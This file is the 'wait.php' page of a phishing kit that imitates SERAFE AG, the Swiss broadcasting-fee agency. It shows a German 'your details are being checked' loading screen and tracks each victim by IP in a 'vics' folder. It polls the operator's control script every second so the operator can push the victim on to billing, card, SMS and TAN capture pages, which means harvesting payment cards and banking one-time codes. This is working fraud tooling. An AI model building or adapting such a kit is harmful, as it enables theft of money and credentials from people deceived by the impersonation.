<?php
// wait.php

$ip = ($_SERVER['REMOTE_ADDR'] === '::1') ? '127.0.0.1' : $_SERVER['REMOTE_ADDR'];
$file = 'vics/' . $ip . '.txt';

if (!is_dir('vics')) mkdir('vics', 0755, true);

$step = 'wait';
if (file_exists($file)) {
    $content = file_get_contents($file);
    $lines = explode("\n", $content);
    $step = trim($lines[0]);
}

if ($step != 'wait') {
    switch ($step) {
        case 'billing':
            header("Location: billing.php");
            exit;
        case 'card':
            header("Location: card.php");
            exit;
        case 'sms':
            header("Location: sms.php");
            exit;
        case 'tan':
            header("Location: tan.php");
            exit;
        case 'reset':
            header("Location: billing.php");
            exit;
        case 'block':
            header("Location: error.html");
            exit;
        case 'success':
            header("Location: done.php");
            exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Serafe - Loading</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: Arial, sans-serif;
}
body {
    background: #f5f5f5;
    color: #333;
}
.topbar {
    background: #0d5c5c;
    color: #fff;
    padding: 10px 20px;
    display: flex;
    justify-content: flex-end;
    gap: 20px;
    font-size: 14px;
}
.header {
    background: #0f6b6b;
    padding: 20px;
}
.logo {
    font-size: 40px;
    color: #fff;
    font-weight: 300;
    letter-spacing: 2px;
}
.content {
    min-height: 60vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    text-align: center;
    padding: 20px;
}
.content h2 {
    font-size: 20px;
    font-weight: normal;
    margin-bottom: 20px;
}
.dots {
    display: flex;
    gap: 8px;
}
.dot {
    width: 8px;
    height: 8px;
    background: #666;
    border-radius: 50%;
    animation: blink 1.4s infinite;
}
.dot:nth-child(2) { animation-delay: 0.2s; }
.dot:nth-child(3) { animation-delay: 0.4s; }
@keyframes blink {
    0%, 80%, 100% { opacity: 0.2; }
    40% { opacity: 1; }
}
.footer {
    padding: 30px 20px;
    background: #eee;
    color: #555;
    font-size: 14px;
    max-width: 900px;
    margin: auto;
    display: flex;
    justify-content: space-between;
}
.footer h3 { margin-bottom: 10px; }
.footer p { margin-bottom: 15px; line-height: 1.5; }
.debug {
    position: fixed;
    bottom: 5px;
    left: 5px;
    font-size: 10px;
    color: #ccc;
    background: rgba(0,0,0,0.7);
    padding: 3px 8px;
    border-radius: 4px;
}
</style>
</head>
<body>
<div class="topbar">
    <span>Wir über uns</span>
    <span>Jobs</span>
    <span>Kontakt</span>
    <span>Deutsch</span>
</div>
<div class="header">
    <div class="logo">serafe</div>
</div>
<div class="content">
    <h2>Ihre Angaben werden geprüft. Bitte warten Sie einen Moment.</h2>
    <div class="dots">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
    </div>
</div>
<div class="footer">
    <div>
        <h3>Kontaktadresse</h3>
        <p>SERAFE AG<br>Schweizerische Erhebungsstelle<br>für die Radio- und Fernsehabgabe<br>Postfach<br>8010 Zürich</p>
    </div>
    <div>
        <h3>Downloads</h3>
        <p>Alle Downloads</p>
    </div>
    <div>
        <p>© SERAFE AG<br>Datenschutz<br>Impressum<br>Disclaimer</p>
    </div>
</div>
<div class="debug">IP: <?php echo $ip; ?> | Step: <?php echo $step; ?></div>

<script>
const currentStep = '<?php echo $step; ?>';
const victimIP = '<?php echo $ip; ?>';

if (currentStep !== 'wait') {
    let redirectUrl = '';
    switch (currentStep) {
        case 'billing': redirectUrl = 'billing.php'; break;
        case 'card': redirectUrl = 'card.php'; break;
        case 'sms': redirectUrl = 'sms.php'; break;
        case 'tan': redirectUrl = 'tan.php'; break;
        case 'reset': redirectUrl = 'billing.php'; break;
        case 'block': redirectUrl = 'error.html'; break;
        case 'success': redirectUrl = 'done.php'; break;
    }
    if (redirectUrl) window.location.href = redirectUrl;
}

function checkStep() {
    fetch('check_step.php?ip=' + victimIP + '&t=' + Date.now())
        .then(response => response.json())
        .then(data => {
            if (data.redirect && data.redirect !== '') {
                window.location.href = data.redirect;
            }
        })
        .catch(error => console.error('Error:', error));
}

setInterval(checkStep, 1000);
checkStep();
</script>
</body>
</html>